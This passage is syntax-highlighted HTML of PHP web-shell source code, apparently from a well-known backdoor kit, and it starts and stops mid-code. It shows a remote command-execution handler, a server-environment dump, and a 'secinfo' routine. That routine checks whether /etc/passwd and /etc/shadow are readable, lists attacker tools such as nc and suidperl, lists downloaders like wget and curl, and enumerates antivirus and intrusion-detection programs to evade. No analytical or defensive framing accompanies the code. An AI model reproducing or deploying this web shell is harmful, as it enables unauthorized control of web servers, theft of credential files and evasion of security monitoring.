<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span> <span style="color: #eaeaea; background-color: #000000;">fgets(</span>$<span style="color: #e7c547;">pipes</span>[<span style="color: #eaeaea; background-color: #000000;">1</span>], <span style="color: #eaeaea; background-color: #000000;">1024</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">fclose(</span>$<span style="color: #e7c547;">pipes</span>[<span style="color: #eaeaea; background-color: #000000;">1</span>]);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span> (!<span style="color: #eaeaea; background-color: #000000;">feof(</span>$<span style="color: #e7c547;">pipes</span>[<span style="color: #eaeaea; background-color: #000000;">2</span>])) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span> <span style="color: #eaeaea; background-color: #000000;">fgets(</span>$<span style="color: #e7c547;">pipes</span>[<span style="color: #eaeaea; background-color: #000000;">2</span>], <span style="color: #eaeaea; background-color: #000000;">1024</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">fclose(</span>$<span style="color: #e7c547;">pipes</span>[<span style="color: #eaeaea; background-color: #000000;">2</span>]);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">proc_close(</span>$<span style="color: #e7c547;">process</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span>(<span style="color: #eaeaea; background-color: #000000;">execute(</span>$<span style="color: #e7c547;">command</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/pre&gt;'</span>);
<span style="background-color: #424242;"> </span>   }
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end shell</span>

<span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">action</span> == <span style="color: #70c0b1;">'phpenv'</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">upsize</span>=<span style="color: #eaeaea; background-color: #000000;">getcfg(</span><span style="color: #70c0b1;">'file_uploads'</span>) ? <span style="color: #eaeaea; background-color: #000000;">getcfg(</span><span style="color: #70c0b1;">'upload_max_filesize'</span>) : <span style="color: #70c0b1;">'Not allowe</span><span style="color: #70c0b1; text-decoration: underline;">d'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">adminmail</span>=<span style="color: #eaeaea; background-color: #000000;">isset(</span>$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'SERVER_ADMIN'</span>]) ? $<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'SERVER_ADMIN'</span>] : <span style="color: #eaeaea; background-color: #000000;">getc</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">fg(</span><span style="color: #70c0b1; text-decoration: underline;">'sendmail_from'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">dis_func</span> &amp;&amp; $<span style="color: #e7c547;">dis_func</span> = <span style="color: #70c0b1;">'No'</span>;<span style="color: #d54e53; background-color: #424242;">     </span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">info</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">1</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'Server Time'</span>,<span style="color: #eaeaea; background-color: #000000;">date(</span><span style="color: #70c0b1;">'Y/m/d h:i:s'</span>,$<span style="color: #e7c547;">timestamp</span>)),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">2</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'Server Domain'</span>,$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'SERVER_NAME'</span>]),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">3</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'Server IP'</span>,<span style="color: #eaeaea; background-color: #000000;">gethostbyname(</span>$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'SERVER_NAME'</span>])),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">4</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'Server OS'</span>,<span style="color: #7aa6da;">PHP_OS</span>),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">5</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'Server OS Charset'</span>,$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'HTTP_ACCEPT_LANGUAGE'</span>]),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">6</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'Server Software'</span>,$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'SERVER_SOFTWARE'</span>]),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">7</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'Server Web Port'</span>,$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'SERVER_PORT'</span>]),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">8</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'PHP run mode'</span>,<span style="color: #eaeaea; background-color: #000000;">strtoupper(php_sapi_name(</span>))),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">9</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'The file path'</span>,<span style="color: #7aa6da;">__FILE__</span>),

<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">10</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'PHP Version'</span>,<span style="color: #7aa6da;">PHP_VERSION</span>),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">11</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'PHPINFO'</span>,(<span style="color: #d54e53; font-weight: bold;">IS_PHPINFO</span> ? <span style="color: #70c0b1;">'&lt;a href="javascript:g(\'phpinfo\');</span><span style="color: #70c0b1; text-decoration: underline;">"&gt;Yes&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">'No'</span><span style="text-decoration: underline;">)),</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">12</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'Safe Mode'</span>,<span style="color: #eaeaea; background-color: #000000;">getcfg(</span><span style="color: #70c0b1;">'safe_mode'</span>)),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">13</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'Administrator'</span>,$<span style="color: #e7c547;">adminmail</span>),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">14</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'allow_url_fopen'</span>,<span style="color: #eaeaea; background-color: #000000;">getcfg(</span><span style="color: #70c0b1;">'allow_url_fopen'</span>)),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">15</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'enable_dl'</span>,<span style="color: #eaeaea; background-color: #000000;">getcfg(</span><span style="color: #70c0b1;">'enable_dl'</span>)),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">16</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'display_errors'</span>,<span style="color: #eaeaea; background-color: #000000;">getcfg(</span><span style="color: #70c0b1;">'display_errors'</span>)),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">17</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'register_globals'</span>,<span style="color: #eaeaea; background-color: #000000;">getcfg(</span><span style="color: #70c0b1;">'register_globals'</span>)),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">18</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'magic_quotes_gpc'</span>,<span style="color: #eaeaea; background-color: #000000;">getcfg(</span><span style="color: #70c0b1;">'magic_quotes_gpc'</span>)),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">19</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'memory_limit'</span>,<span style="color: #eaeaea; background-color: #000000;">getcfg(</span><span style="color: #70c0b1;">'memory_limit'</span>)),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">20</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'post_max_size'</span>,<span style="color: #eaeaea; background-color: #000000;">getcfg(</span><span style="color: #70c0b1;">'post_max_size'</span>)),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">21</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'upload_max_filesize'</span>,$<span style="color: #e7c547;">upsize</span>),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">22</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'max_execution_time'</span>,<span style="color: #eaeaea; background-color: #000000;">getcfg(</span><span style="color: #70c0b1;">'max_execution_time'</span>).<span style="color: #70c0b1;">' second(s</span><span style="color: #70c0b1; text-decoration: underline;">)'</span><span style="text-decoration: underline;">),</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">23</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'disable_functions'</span>,$<span style="color: #e7c547;">dis_func</span>),
<span style="background-color: #424242;"> </span>   );

<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">phpvarname</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span>$<span style="color: #e7c547;">phpvarname</span> .<span style="color: #70c0b1;">' : '</span>.<span style="color: #eaeaea; background-color: #000000;">getcfg(</span>$<span style="color: #e7c547;">phpvarname</span>));
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Server environment'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'phpenv'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Please input PHP configuration parameter(eg:magic_</span><span style="color: #70c0b1; text-decoration: underline;">quotes_gpc)'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #70c0b1; text-decoration: underline;">'phpvarname'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #e7c547; text-decoration: underline;">phpvarname</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfooter(</span>);

<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">hp</span> = <span style="color: #eaeaea; background-color: #000000;">array(0</span>=&gt; <span style="color: #70c0b1;">'Server'</span>, <span style="color: #eaeaea; background-color: #000000;">1</span>=&gt; <span style="color: #70c0b1;">'PHP'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">for</span>($<span style="color: #e7c547;">a</span>=<span style="color: #eaeaea; background-color: #000000;">0</span>;$<span style="color: #e7c547;">a</span>&lt;<span style="color: #eaeaea; background-color: #000000;">2</span>;$<span style="color: #e7c547;">a</span>++) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h2&gt;'</span>.$<span style="color: #e7c547;">hp</span>[$<span style="color: #e7c547;">a</span>].<span style="color: #70c0b1;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;ul class="info"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">a</span>==<span style="color: #eaeaea; background-color: #000000;">0</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">for</span>($<span style="color: #e7c547;">i</span>=<span style="color: #eaeaea; background-color: #000000;">1</span>;$<span style="color: #e7c547;">i</span>&lt;=<span style="color: #eaeaea; background-color: #000000;">9</span>;$<span style="color: #e7c547;">i</span>++) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;li&gt;&lt;u&gt;'</span>.$<span style="color: #e7c547;">info</span>[$<span style="color: #e7c547;">i</span>][<span style="color: #eaeaea; background-color: #000000;">0</span>].<span style="color: #70c0b1;">':&lt;/u&gt;'</span>.$<span style="color: #e7c547;">info</span>[$<span style="color: #e7c547;">i</span>][<span style="color: #eaeaea; background-color: #000000;">1</span>].<span style="color: #70c0b1;">'&lt;/li&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">a</span> == <span style="color: #eaeaea; background-color: #000000;">1</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">for</span>($<span style="color: #e7c547;">i</span>=<span style="color: #eaeaea; background-color: #000000;">10</span>;$<span style="color: #e7c547;">i</span>&lt;=<span style="color: #eaeaea; background-color: #000000;">23</span>;$<span style="color: #e7c547;">i</span>++) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;li&gt;&lt;u&gt;'</span>.$<span style="color: #e7c547;">info</span>[$<span style="color: #e7c547;">i</span>][<span style="color: #eaeaea; background-color: #000000;">0</span>].<span style="color: #70c0b1;">':&lt;/u&gt;'</span>.$<span style="color: #e7c547;">info</span>[$<span style="color: #e7c547;">i</span>][<span style="color: #eaeaea; background-color: #000000;">1</span>].<span style="color: #70c0b1;">'&lt;/li&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/ul&gt;'</span>);
<span style="background-color: #424242;"> </span>   }
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end phpenv</span>

<span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">action</span> == <span style="color: #70c0b1;">'secinfo'</span>) {

<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Server software'</span>, @<span style="color: #eaeaea; background-color: #000000;">getenv(</span><span style="color: #70c0b1;">'SERVER_SOFTWARE'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Disabled PHP Functions'</span>, ($<span style="color: #7aa6da;">GLOBALS</span>[<span style="color: #70c0b1;">'disable_functions'</span>])?$<span style="color: #7aa6da;">GLOBALS</span>[<span style="color: #70c0b1; text-decoration: underline;">'disable_functions'</span><span style="text-decoration: underline;">]:</span><span style="color: #70c0b1; text-decoration: underline;">'none'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Open base dir'</span>, @<span style="color: #eaeaea; background-color: #000000;">ini_get(</span><span style="color: #70c0b1;">'open_basedir'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Safe mode exec dir'</span>, @<span style="color: #eaeaea; background-color: #000000;">ini_get(</span><span style="color: #70c0b1;">'safe_mode_exec_dir'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Safe mode include dir'</span>, @<span style="color: #eaeaea; background-color: #000000;">ini_get(</span><span style="color: #70c0b1;">'safe_mode_include_dir'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'cURL support'</span>, <span style="color: #eaeaea; background-color: #000000;">function_exists(</span><span style="color: #70c0b1;">'curl_version'</span>)?<span style="color: #70c0b1;">'enabled'</span>:<span style="color: #70c0b1;">'no'</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">temp</span>=<span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">function_exists(</span><span style="color: #70c0b1;">'mysql_get_client_info'</span>))
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">temp</span>[] = <span style="color: #70c0b1;">"MySql ("</span>.<span style="color: #eaeaea; background-color: #000000;">mysql_get_client_info(</span>).<span style="color: #70c0b1;">")"</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">function_exists(</span><span style="color: #70c0b1;">'mssql_connect'</span>))
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">temp</span>[] = <span style="color: #70c0b1;">"MSSQL"</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">function_exists(</span><span style="color: #70c0b1;">'pg_connect'</span>))
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">temp</span>[] = <span style="color: #70c0b1;">"PostgreSQL"</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">function_exists(</span><span style="color: #70c0b1;">'oci_connect'</span>))
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">temp</span>[] = <span style="color: #70c0b1;">"Oracle"</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Supported databases'</span>, <span style="color: #eaeaea; background-color: #000000;">implode(</span><span style="color: #70c0b1;">', '</span>, $<span style="color: #e7c547;">temp</span>));

<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>( !<span style="color: #d54e53; font-weight: bold;">IS_WIN</span> ) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">userful</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'gcc'</span>,<span style="color: #70c0b1;">'lcc'</span>,<span style="color: #70c0b1;">'cc'</span>,<span style="color: #70c0b1;">'ld'</span>,<span style="color: #70c0b1;">'make'</span>,<span style="color: #70c0b1;">'php'</span>,<span style="color: #70c0b1;">'perl'</span>,<span style="color: #70c0b1;">'python'</span>,<span style="color: #70c0b1;">'rub</span><span style="color: #70c0b1; text-decoration: underline;">y'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'tar'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'gzip'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'bzip'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'bzip2'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'nc'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'locate'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'suidperl'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">danger</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'kav'</span>,<span style="color: #70c0b1;">'nod32'</span>,<span style="color: #70c0b1;">'bdcored'</span>,<span style="color: #70c0b1;">'uvscan'</span>,<span style="color: #70c0b1;">'sav'</span>,<span style="color: #70c0b1;">'drwebd'</span>,<span style="color: #70c0b1;">'clamd'</span>,<span style="color: #70c0b1; text-decoration: underline;">'rkhunter'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'chkrootkit'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'iptables'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'ipfw'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'tripwire'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'shieldcc'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'portsentry'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'snort'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'ossec'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'lidsadm'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'tcplodg'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'sxid'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'logcheck'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'logwatch'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'sysmask'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'zmbscap'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'sawmill'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'wormscan'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'ninja'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">downloaders</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'wget'</span>,<span style="color: #70c0b1;">'fetch'</span>,<span style="color: #70c0b1;">'lynx'</span>,<span style="color: #70c0b1;">'links'</span>,<span style="color: #70c0b1;">'curl'</span>,<span style="color: #70c0b1;">'get'</span>,<span style="color: #70c0b1;">'lwp-mir</span><span style="color: #70c0b1; text-decoration: underline;">ror'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Readable /etc/passwd'</span>, @<span style="color: #eaeaea; background-color: #000000;">is_readable(</span><span style="color: #70c0b1;">'/etc/passwd'</span>) ? <span style="color: #70c0b1;">"yes"</span> : <span style="color: #70c0b1;">'</span><span style="color: #70c0b1; text-decoration: underline;">no'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Readable /etc/shadow'</span>, @<span style="color: #eaeaea; background-color: #000000;">is_readable(</span><span style="color: #70c0b1;">'/etc/shadow'</span>) ? <span style="color: #70c0b1;">"yes"</span> : <span style="color: #70c0b1;">'</span><span style="color: #70c0b1; text-decoration: underline;">no'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'OS version'</span>, @<span style="color: #eaeaea; background-color: #000000;">file_get_contents(</span><span style="color: #70c0b1;">'/proc/version'</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Distr name'</span>, @<span style="color: #eaeaea; background-color: #000000;">file_get_contents(</span><span style="color: #70c0b1;">'/etc/issue.net'</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">safe_mode</span> = @<span style="color: #eaeaea; background-color: #000000;">ini_get(</span><span style="color: #70c0b1;">'safe_mode'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(!$<span style="color: #7aa6da;">GLOBALS</span>[<span style="color: #70c0b1;">'safe_mode'</span>]) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">temp</span>=<span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span> ($<span style="color: #e7c547;">userful</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">item</span>)
